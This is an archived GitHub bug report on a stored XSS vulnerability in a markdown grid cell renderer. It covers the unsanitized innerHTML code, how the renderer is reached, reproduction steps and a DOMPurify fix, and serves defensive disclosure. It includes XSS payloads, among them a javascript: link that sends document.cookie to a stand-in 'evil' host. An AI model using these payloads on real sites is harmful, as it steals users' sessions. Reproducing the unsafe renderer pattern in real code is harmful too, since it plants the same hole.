# GH#3336 — bug(vibegrid): markdown cell renderer is an XSS sink — unsanitized innerHTML + attacker-controlled href

> Archived from `baseplane-ai/baseplane` issue #3336 (state: OPEN, opened 2026-08-24) on 2026-09-07, before that repo was wound down.

---

## Summary

`MarkdownCellRenderer` writes an unsanitized, regex-transformed cell value straight into `innerHTML`. Any user who can write a `markdown`-typed field value gets script execution in every grid that renders that column, for every viewer.

Found while tracing #3291's drop-list for #3293. #3291 lists this renderer as a drop candidate (*"Regex markdown 'preview' — broken-by-design partial transform; use a real MD renderer instead"*), which is the right remedy but understates it as a quality issue rather than a security one.

## The sink

`apps/web/src/systems/vibegrid/slots/renderers/markdown.ts:28`

```js
const text = String(value)                              // raw cell value from the DB
const content = document.createElement('span')
content.dataset.action = isEditable ? 'edit' : 'none'
content.dataset.affordanceRole = 'content'
content.innerHTML = this.createMarkdownPreview(text)    // <-- no escaping anywhere
```

`createMarkdownPreview` (`:41-52`) is six chained regex replaces with no sanitization step:

```js
return markdown
  .replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')
  .replace(/\*(.*?)\*/g, '<em>$1</em>')
  .replace(/^# (.*$)/gm, '<h3>$1</h3>')
  .replace(/^## (.*$)/gm, '<h4>$1</h4>')
  .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>')
  .replace(/\n/g, '<br>')
```

Two distinct problems:

1. **Passthrough.** Anything not matched by a regex reaches `innerHTML` verbatim. `<img src=x onerror=alert(document.cookie)>` in a cell value executes on render.
2. **Attacker-controlled `href`.** The link rule interpolates capture group `$2` directly into an href with no scheme allowlist. `[click](javascript:fetch('https://evil/'+document.cookie))` produces a live `javascript:` link.

## Reachability — confirmed live, not latent

| Step | Evidence |

| That path is the one in use | `stores/TableCoreStore.ts:2300` calls `generateColumnsFromEntitySchema` |

| Fields of this type get created | `scripts/test/add-vibegrid-test-fields.sh:44` — `{"name": "test_markdown", "type": "markdown", ...}` |

Note `schema/SchemaAdapter.ts:389-391` maps `markdown` → `'textarea'`, which would dodge this — but `SchemaAdapter` is only re-exported from `field-types/index.ts:43` and is **not** on the live column-generation path. Do not rely on it as mitigation.

**DOMPurify is already a dependency** and is used in the email/communications paths (`shared/lib/email-utils.ts`, `features/email-inbox/*`, `features/communications/*`). It was never wired into the grid renderers.

## Reproduce

1. Add a `markdown`-typed field to any entity (`scripts/test/add-vibegrid-test-fields.sh` does this for WideCorp).
2. Set a record's value for that field to `<img src=x onerror=alert(1)>`.
3. Open a grid showing that column.

Expected: escaped text. Actual: the handler fires.

Variant for the href path: `[click me](javascript:alert(1))`, then click the rendered link.

## Suggested fix

Short term — sanitize before assignment, matching the pattern already used in `features/email-inbox/components/MessageItem.tsx`:

```js
import DOMPurify from 'dompurify'
content.innerHTML = DOMPurify.sanitize(this.createMarkdownPreview(text), {
  ALLOWED_TAGS: ['strong', 'em', 'h3', 'h4', 'a', 'br'],
  ALLOWED_ATTR: ['href'],
  ALLOWED_URI_REGEXP: /^(?:https?|mailto):/i,
})
```

Longer term — replace the regex transform with a real markdown renderer, per #3291. That closes the correctness gap as well, but the sanitization above should land first and independently: it is a small, self-contained change that does not depend on any grid-architecture decision.

**Audit note:** `innerHTML` assignment in cell renderers is worth a sweep beyond this one file — this was found by inspection, not by an exhaustive search of the renderer set.
